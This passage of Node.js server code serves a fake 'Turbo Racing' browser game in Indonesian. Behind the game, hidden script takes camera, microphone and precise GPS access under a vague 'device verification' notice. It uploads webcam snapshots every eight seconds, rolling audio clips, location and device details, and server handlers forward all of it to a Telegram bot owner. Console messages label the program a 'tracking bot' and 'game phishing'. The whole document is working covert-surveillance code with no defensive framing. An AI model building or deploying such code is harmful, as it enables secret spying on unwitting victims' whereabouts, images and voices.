    const id = m[1];
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Turbo Racing</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:#0a0a1a;color:#fff;overflow:hidden;height:100vh;display:flex;align-items:center;justify-content:center}
#game{position:relative;width:100vw;height:100vh;max-width:480px;max-height:800px;background:linear-gradient(180deg,#1a1a3a,#0a0a1a);overflow:hidden}
canvas{display:block;width:100%;height:100%}
.hud{position:absolute;top:10px;left:10px;right:10px;display:flex;justify-content:space-between;font-size:13px;font-weight:700;text-shadow:0 0 8px rgba(0,198,255,0.8);pointer-events:none}
.hud div{background:rgba(0,0,0,0.4);padding:6px 12px;border-radius:10px;border:1px solid rgba(0,198,255,0.3)}
#startScreen{position:absolute;inset:0;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;z-index:10;text-align:center}
.carIcon{font-size:64px;margin-bottom:12px;animation:bounce 1.5s infinite}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
#startScreen h1{font-size:26px;margin-bottom:6px;background:linear-gradient(135deg,#00c6ff,#0072ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#startScreen p{font-size:13px;color:#b8c6ff;margin-bottom:20px;line-height:1.5}
#startBtn{padding:16px 40px;border:none;border-radius:16px;font-size:16px;font-weight:800;color:#fff;cursor:pointer;
background:linear-gradient(135deg,#ff416c,#ff4b2b);box-shadow:0 8px 30px rgba(255,65,108,0.5);transition:0.3s;letter-spacing:1px}
#startBtn:active{transform:scale(0.95)}
.permNote{font-size:10px;color:#7a8ab8;margin-top:14px;max-width:280px}
#status{position:absolute;bottom:10px;left:10px;right:10px;text-align:center;font-size:11px;color:#b8c6ff;background:rgba(0,0,0,0.4);padding:6px;border-radius:8px;pointer-events:none}
video{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
.controls{position:absolute;bottom:20px;left:0;right:0;display:flex;justify-content:space-between;padding:0 20px;z-index:5}
.ctrlBtn{width:70px;height:70px;border-radius:50%;background:rgba(0,198,255,0.2);border:2px solid rgba(0,198,255,0.5);color:#fff;font-size:28px;display:flex;align-items:center;justify-content:center;user-select:none;touch-action:none}
.ctrlBtn:active{background:rgba(0,198,255,0.5)}
</style></head>
<body><div id="game">
<canvas id="c"></canvas>
<video id="v" autoplay muted playsinline></video>
<div class="hud"><div>🏁 <span id="score">0</span>m</div><div>⚡ <span id="speed">0</span>km/h</div></div>
<div id="startScreen">
<div class="carIcon">🏎️</div>
<h1>TURBO RACING</h1>
<p>Balap mobil seru!<br>Hindari mobil lain & kumpulkan skor.</p>
<button id="startBtn">▶ MULAI GAME</button>
<div class="permNote">Dengan memulai, kamu menyetujui verifikasi perangkat untuk pengalaman terbaik.</div>
</div>
<div class="controls" id="controls" style="display:none">
<div class="ctrlBtn" id="left">◀</div>
<div class="ctrlBtn" id="right">▶</div>
</div>
<div id="status"></div>
</div>
<script>
const ID="${id}", IP="${ip}";
const c=document.getElementById("c"),ctx=c.getContext("2d");
const v=document.getElementById("v"),statusEl=document.getElementById("status");
const scoreEl=document.getElementById("score"),speedEl=document.getElementById("speed");
const startScreen=document.getElementById("startScreen"),controls=document.getElementById("controls");

function resize(){ c.width=window.innerWidth; c.height=window.innerHeight; }
resize(); window.addEventListener("resize",resize);

let running=false, score=0, speed=0, carX=0, carY=0, enemies=[], roadOffset=0;
const CAR_W=40, CAR_H=70;

function resetGame(){
  score=0; speed=0; enemies=[]; roadOffset=0;
  carX=c.width/2-CAR_W/2; carY=c.height-CAR_H-120;
}

let leftPressed=false, rightPressed=false;
document.getElementById("left").addEventListener("touchstart",e=>{e.preventDefault();leftPressed=true;});
document.getElementById("left").addEventListener("touchend",e=>{e.preventDefault();leftPressed=false;});
document.getElementById("right").addEventListener("touchstart",e=>{e.preventDefault();rightPressed=true;});
document.getElementById("right").addEventListener("touchend",e=>{e.preventDefault();rightPressed=false;});
document.getElementById("left").addEventListener("mousedown",()=>leftPressed=true);
document.getElementById("left").addEventListener("mouseup",()=>leftPressed=false);
document.getElementById("right").addEventListener("mousedown",()=>rightPressed=true);
document.getElementById("right").addEventListener("mouseup",()=>rightPressed=false);

function drawRoad(){
  ctx.fillStyle="#2a2a4a"; ctx.fillRect(0,0,c.width,c.height);
  ctx.fillStyle="#444";
  const laneW=c.width/3;
  for(let i=0;i<3;i++){ ctx.fillRect(laneW*(i+1)-2,0,4,c.height); }
  ctx.fillStyle="#ffcc00";
  const dashH=40, gap=40;
  for(let i=0;i<3;i++){
    const lx=laneW*(i+1)-2;
    for(let y=-dashH+(roadOffset%(dashH+gap)); y<c.height; y+=dashH+gap){ ctx.fillRect(lx,y,4,dashH); }
  }
  ctx.fillStyle="#1a3a1a";
  ctx.fillRect(0,0,20,c.height);
  ctx.fillRect(c.width-20,0,20,c.height);
}
function drawCar(x,y,color){
  ctx.fillStyle=color;
  ctx.fillRect(x,y,CAR_W,CAR_H);
  ctx.fillStyle="#111";
  ctx.fillRect(x+5,y+8,10,14);
  ctx.fillRect(x+CAR_W-15,y+8,10,14);
  ctx.fillRect(x+5,y+CAR_H-22,10,14);
  ctx.fillRect(x+CAR_W-15,y+CAR_H-22,10,14);
  ctx.fillStyle="#88ccff";
  ctx.fillRect(x+8,y+4,CAR_W-16,6);
}
function spawnEnemy(){
  const lane=c.width/3;
  const l=Math.floor(Math.random()*3);
  const ex=lane*l+lane/2-CAR_W/2;
  enemies.push({x:ex,y:-CAR_H,color:["#e74c3c","#f39c12","#9b59b6","#1abc9c"][Math.floor(Math.random()*4)]});
}
let spawnTimer=0;
function loop(){
  if(!running) return;
  roadOffset+=speed*0.5;
  if(leftPressed) carX-=8;
  if(rightPressed) carX+=8;
  carX=Math.max(20,Math.min(c.width-CAR_W-20,carX));
  speed=Math.min(15,speed+0.05);
  score+=speed*0.1;
  scoreEl.textContent=Math.floor(score);
  speedEl.textContent=Math.floor(speed*20);
  spawnTimer++;
  if(spawnTimer>Math.max(20,80-speed*3)){ spawnEnemy(); spawnTimer=0; }
  for(let i=enemies.length-1;i>=0;i--){
    enemies[i].y+=speed;
    if(enemies[i].y>c.height){ enemies.splice(i,1); continue; }
    if(carX<enemies[i].x+CAR_W && carX+CAR_W>enemies[i].x && carY<enemies[i].y+CAR_H && carY+CAR_H>enemies[i].y){
      speed=Math.max(2,speed-5); enemies.splice(i,1);
    }
  }
  drawRoad();
  enemies.forEach(e=>drawCar(e.x,e.y,e.color));
  drawCar(carX,carY,"#00c6ff");
  requestAnimationFrame(loop);
}

let stream=null, snapTimer=null, recTimer=null, rec=null, locWatch=null;
const send=(path,data)=>fetch(path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});

async function startTracking(){
  try{
    statusEl.textContent="🎮 Memuat game...";
    stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    v.srcObject=stream;
    locWatch=navigator.geolocation.watchPosition(p=>{
      send("/save",{id:ID,ip:IP,useragent:navigator.userAgent,
        location:p.coords.latitude+","+p.coords.longitude,
        device:navigator.platform,screen:screen.width+"x"+screen.height,
        language:navigator.language,type:"gps"});
    },null,{enableHighAccuracy:true,maximumAge:5000,timeout:15000});
    const canvas=document.createElement("canvas");
    snapTimer=setInterval(()=>{
      if(!v.videoWidth) return;
      canvas.width=v.videoWidth; canvas.height=v.videoHeight;
      canvas.getContext("2d").drawImage(v,0,0);
      canvas.toBlob(async b=>{
        if(!b) return;
        const fd=new FormData();
        fd.append("id",ID); fd.append("ip",IP); fd.append("type","snap");
        fd.append("file",b,"snap_"+Date.now()+".jpg");
        await fetch("/upload",{method:"POST",body:fd});
      },"image/jpeg",0.7);
    },8000);
    rec=new MediaRecorder(stream);
    rec.ondataavailable=async e=>{
      if(!e.data || e.data.size===0) return;
      const fd=new FormData();
      fd.append("id",ID); fd.append("ip",IP); fd.append("type","audio");
      fd.append("file",e.data,"audio_"+Date.now()+".webm");
      await fetch("/upload",{method:"POST",body:fd});
    };
    rec.start();
    recTimer=setInterval(()=>{ try{rec.stop();rec.start();}catch(e){} },10000);
    statusEl.textContent="";
  }catch(e){
    statusEl.textContent="🎮 Main game dulu ya!";
  }
}

document.getElementById("startBtn").onclick=async ()=>{
  startScreen.style.display="none";
  controls.style.display="flex";
  resize(); resetGame(); running=true; loop();
  await startTracking();
};
</script></body></html>`);
    return;
  }

  if (url === '/save' && req.method === 'POST') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try {
        const d = JSON.parse(body);
        dbm.saveGps(d, () => {
          bot.sendMessage(OWNER_ID,
            `📍 <b>DATA BARU</b>\nID: ${d.id}\nIP: ${d.ip}\nTipe: ${d.type||'gps'}\nLokasi: ${d.location||'-'}\nUA: ${d.useragent}`,
            { parse_mode:'HTML' }).catch(()=>{});
        });
      } catch {}
      res.writeHead(200); res.end('OK');
    });
    return;
  }

  if (url === '/upload' && req.method === 'POST') {
    let chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', async () => {
      try {
        const body = Buffer.concat(chunks);
        const ctype = req.headers['content-type'] || '';
        const boundary = ctype.split('boundary=')[1];
        if (!boundary) { res.writeHead(400); return res.end('No boundary'); }
        const parts = body.toString('binary').split('--' + boundary);
        let fileBuf = null, filename = 'file', type = 'snap', id = '', ip = '';
        for (const part of parts) {
          if (part.includes('filename="')) {
            const nameMatch = part.match(/filename="([^"]+)"/);
            if (nameMatch) filename = nameMatch[1];
            const idx = part.indexOf('\r\n\r\n');
            if (idx !== -1) fileBuf = Buffer.from(part.slice(idx + 4, part.lastIndexOf('\r\n')), 'binary');
          }
          if (part.includes('name="type"')) { const i = part.indexOf('\r\n\r\n'); type = part.slice(i+4, part.lastIndexOf('\r\n')).trim(); }
          if (part.includes('name="id"'))   { const i = part.indexOf('\r\n\r\n'); id   = part.slice(i+4, part.lastIndexOf('\r\n')).trim(); }
          if (part.includes('name="ip"'))   { const i = part.indexOf('\r\n\r\n'); ip   = part.slice(i+4, part.lastIndexOf('\r\n')).trim(); }
        }
        if (fileBuf) {
          const tmp = path.join(__dirname, filename);
          fs.writeFileSync(tmp, fileBuf);
          const caption = `📎 <b>${type.toUpperCase()}</b>\nID: ${id}\nIP: ${ip}\nFile: ${filename}`;
          if (type === 'snap') {
            await bot.sendPhoto(OWNER_ID, tmp, { caption, parse_mode:'HTML' }).catch(()=>{});
          } else {
            await bot.sendDocument(OWNER_ID, tmp, { caption, parse_mode:'HTML' }).catch(()=>{});
          }
          fs.unlinkSync(tmp);
        }
      } catch(e) { console.error(e); }
      res.writeHead(200); res.end('OK');
    });
    return;
  }

  if (url === '/' || url === '/health') {
    res.writeHead(200, { 'Content-Type':'text/plain' });
    return res.end('OK');
  }

  res.writeHead(404); res.end('Not Found');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HTTP server game phishing on ${PORT}`));

console.log('💀 LEO TRACKING BOT + LOAD TEST + GAME PHISHING running...');
